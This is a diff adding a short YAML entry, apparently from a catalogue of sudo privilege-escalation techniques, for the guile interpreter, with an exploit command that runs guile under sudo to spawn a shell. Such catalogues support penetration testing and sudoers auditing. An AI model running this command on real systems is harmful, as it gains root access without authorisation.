@@ -1,0 +1,4 @@
+name: guile
+binary_path: /usr/bin/guile
+exploit_cmds:
+- sudo /usr/bin/guile -c '(system "/bin/sh")'
